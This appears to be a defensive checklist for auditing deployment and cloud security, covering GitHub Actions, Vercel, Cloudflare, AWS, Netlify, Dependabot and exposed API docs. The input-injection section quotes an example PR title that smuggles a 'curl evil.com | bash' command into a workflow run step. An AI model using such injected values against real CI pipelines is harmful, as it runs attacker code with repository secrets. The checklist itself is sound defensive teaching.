# Deployment & Cloud Security — Instruction 08

## Coverage

CI/CD security, Vercel, Cloudflare, AWS, Netlify, GitHub Actions
CWE-269, CWE-798, ASVS V10.3

---

## GitHub Actions Security

### 1. Permissions — Least Privilege

```yaml
# 🔴 Too permissive
permissions: write-all

# 🟢 Minimal permissions per job
permissions:
  contents: read
  packages: write
  id-token: write  # only if OIDC needed
```

### 2. Pin Actions to SHA (Not Tags)

```yaml
# 🔴 Tags can be changed or deleted
uses: actions/checkout@v4
uses: actions/setup-node@v3

# 🟢 Pin to specific commit SHA
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af  # v4.1.0
```

### 3. pull_request_target + Checkout = CRITICAL RCE

```yaml
# 🔴 CRITICAL — Fork's code runs with repo secrets!
on: pull_request_target
jobs:
  test:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }} # 🔴 fork code!
      - run: npm install && npm test # executes attacker's code with secrets

# 🟢 Never combine pull_request_target + checkout of fork code
# Use pull_request instead (no repo secrets access)
```

### 4. Input Injection in Run Steps

```yaml
# 🔴 Context data injected into shell command
- run: echo "PR title: ${{ github.event.pull_request.title }}"
# Attacker's PR title: "'; curl evil.com | bash; '"

# 🟢 Use environment variables
- name: Echo PR title
  env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $TITLE"
```

### 5. Secrets Not in Logs

```yaml
# 🔴 Secret visible in logs
- run: echo "API key is ${{ secrets.API_KEY }}"
# 🟢 GitHub masks secrets in logs automatically
# But never echo secrets intentionally
```

### 6. GITHUB_TOKEN Scope

```yaml
# Verify GITHUB_TOKEN is not used beyond its need
# Default: read access to repo
# Don't request write access unless deploying
```

---

## Vercel

### 7. Environment Variables in Vercel

```
# 🔴 CRITICAL — Prefix exposes to browser bundle!
NEXT_PUBLIC_STRIPE_SECRET=sk_live_xxx  # exposed to everyone!

# 🟢 Only truly public values use NEXT_PUBLIC_
NEXT_PUBLIC_STRIPE_KEY=pk_live_xxx    # publishable key = OK
STRIPE_SECRET_KEY=sk_live_xxx         # no prefix = server only

# Rule: Any variable with NEXT_PUBLIC_ prefix is visible in the browser
```

### 8. Vercel Edge Config Secrets

```json
// vercel.json — never put secrets here (committed to git)
// Use Vercel Dashboard → Settings → Environment Variables
```

### 9. Vercel Headers

```json
// vercel.json — add security headers
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        { "key": "X-Content-Type-Options", "value": "nosniff" },
        { "key": "X-Frame-Options", "value": "DENY" },
        { "key": "Strict-Transport-Security", "value": "max-age=63072000" }
      ]
    }
  ]
}
```

---

## Cloudflare

### 10. Cloudflare Workers Secrets

```js
// 🔴 Hardcoded in worker script
const API_KEY = 'sk_live_abc123';

// 🟢 Cloudflare Secrets (wrangler secret put API_KEY)
const API_KEY = env.API_KEY;
```

### 11. Wrangler.toml

```toml
# 🔴 Never put secrets in wrangler.toml (committed to git)
[vars]
API_KEY = "secret_value"  # 🔴

# 🟢 Use [vars] for non-sensitive only, secrets via CLI
[vars]
ENVIRONMENT = "production"
# For secrets: wrangler secret put MY_SECRET
```

### 12. Cloudflare Security Settings

Check (guided — user must verify in dashboard):

- WAF enabled for production
- Bot Management active (if enterprise)
- Rate limiting rules configured
- DDoS protection enabled (automatic on free+)
- SSL/TLS mode: Full (Strict)

---

## AWS

### 13. IAM Least Privilege

```json
// 🔴 Admin access for app
{ "Effect": "Allow", "Action": "*", "Resource": "*" }

// 🟢 Only what's needed
{ "Effect": "Allow", "Action": ["s3:GetObject", "s3:PutObject"],
  "Resource": "arn:aws:s3:::my-bucket/*" }
```

### 14. S3 Bucket Security

```
// 🔴 CRITICAL — Public bucket with sensitive data
"BlockPublicAcls": false
"PublicAccessBlockConfiguration": { all: false }

// Check: aws s3api get-bucket-acl --bucket my-bucket
// Verify: Block Public Access = enabled
// Verify: No bucket policy grants public access
```

### 15. AWS Credentials Not in Code

```js
// 🔴 NEVER in code
AWS.config.update({
  accessKeyId: 'AKIAIOSFODNN7EXAMPLE',
  secretAccessKey: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
});

// 🟢 Use IAM roles (for EC2/Lambda) or environment variables
// SDK auto-detects from env or instance metadata
```

---

## Netlify / Railway / Render

### 16. Environment Variables via Dashboard Only

- Never commit `.env.production` to git
- Use platform dashboard for all production secrets
- Check: `netlify.toml` / `railway.json` contain no secrets

---

## Dependabot

### 17. Dependabot Configuration

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: 'npm'
    directory: '/'
    schedule:
      interval: 'weekly'
    assignees:
      - 'your-github-username'
    labels:
      - 'security'
```

If missing → create (Level 2).

---

## API Docs Exposure in Production

### 18. Development Endpoints Disabled

```js
// 🔴 Swagger/API docs accessible in production
app.use('/api-docs', swaggerUi.serve);

// 🟢 Only in development
if (process.env.NODE_ENV !== 'production') {
  app.use('/api-docs', swaggerUi.serve);
}
```

Scan for exposed routes:

```
/swagger, /api-docs, /openapi.json, /openapi.yaml
/__graphql, /graphql (introspection + playground)
/admin, /phpmyadmin, /adminer
/status, /health (if it exposes too much info)
```

---

## Signed Commits (ASVS Level 3)

### 19. Require Signed Commits

Advise user to:

```bash
git config --global commit.gpgsign true
# GitHub: Settings → Branches → Require signed commits
```
